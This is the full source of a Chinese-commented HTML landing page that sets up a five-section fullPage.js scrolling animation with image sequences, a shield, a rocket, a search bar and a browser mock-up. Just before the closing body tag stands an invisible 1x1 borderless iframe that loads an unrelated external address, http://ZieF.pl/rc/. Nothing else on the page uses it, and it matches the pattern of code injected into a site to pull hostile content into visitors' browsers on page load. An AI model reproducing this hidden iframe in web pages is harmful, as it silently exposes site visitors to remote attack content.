<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="css/my_index.css">
</head>
<body>
	<div id="dowebok">
		<!-- 第一屏 -->
	    <div class="section first">
	    	<!-- logo -->
	        <div class="logo">
	        	<!-- <img src="images/logo.png"> -->
	        </div>
	        <!-- 文字动画 -->
	        <div class="text">
	        	<img src="images/text_1.png">
	        	<img src="images/text_2.png">
	        	<img src="images/text_3.png">
	        	<img src="images/text_4.png">
	        	<img src="images/text_5.png">
	        	<img src="images/text_6.png">
	        	<img src="images/text_7.png">
	        	<img src="images/text_8.png">
	        </div>
	        <!-- 下方信息 -->
	        <div class="info"></div>
	    </div>
	    <!-- 第二屏 -->
	    <div class="section second">
	    	<!-- 左边盾牌 -->
	        <div class="shield">
	        	<img src="images/shield_1.png">
	        	<img src="images/shield_2.png">
	        	<img src="images/shield_3.png">
	        	<img src="images/shield_4.png">
	        	<img src="images/shield_5.png">
	        	<img src="images/shield_6.png">
	        	<img src="images/shield_7.png">
	        	<img src="images/shield_8.png">
	        	<img src="images/shield_9.png">
	        </div>
	        <!-- 右边信息 -->
	        <div class="info"></div>
	    </div>
	    <!-- 第三屏 -->
	    <div class="section third">
	    	<!-- 左边信息 -->
	        <div class="info"></div>
	        <!-- 右边圆环 -->
	        <div class="circle"></div>
	        <!-- 右边火箭 -->
	        <div class="rocket"></div> 
	    </div>
	    <!-- 第四屏 -->
	    <div class="section forth">
	    	<!-- 左边搜索栏 -->
	    	<div class="search">
	    		<!-- 搜索关键字 -->
	    		<div class="key"></div>
	    		<!-- 搜索框 -->
	    		<div class="input"></div>
	    		<!-- 搜索结果 -->
	    		<div class="wrap">
	    			<div class="result"></div>
	    		</div>
	    	</div>
	    	<!-- 右边信息 -->
	    	<div class="info"></div>
	    </div>
	    <!-- 第五屏 -->
	    <div class="section fifth">
	    	<!-- 上方信息 -->
	    	<div class="info"></div>
	    	<!-- 下方浏览器 -->
	    	<div class="browser">
	    		<!-- 浏览器四条边框 -->
	    		<div class="leftline"></div>
	    		<div class="topline"></div>
	    		<div class="rightline"></div>
	    		<div class="bottomline"></div>
	    		<!-- 工具栏 -->
	    		<div class="toolbar"></div>
	    		<!-- 边框盒子 -->
	    		<div class="box">
	    			<span></span>
	    		</div>
	    		<!-- 里面的一条线 -->
	    		<div class="line"></div>
	    		<!-- 右下，其他 -->
	    		<div class="extra"></div>
	    	</div>
	    </div>
	</div>



<script src="js/jquery.min.js"></script>
<script src="js/jquery.fullPage.min.js"></script>
<script src="js/my_js.js"></script>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
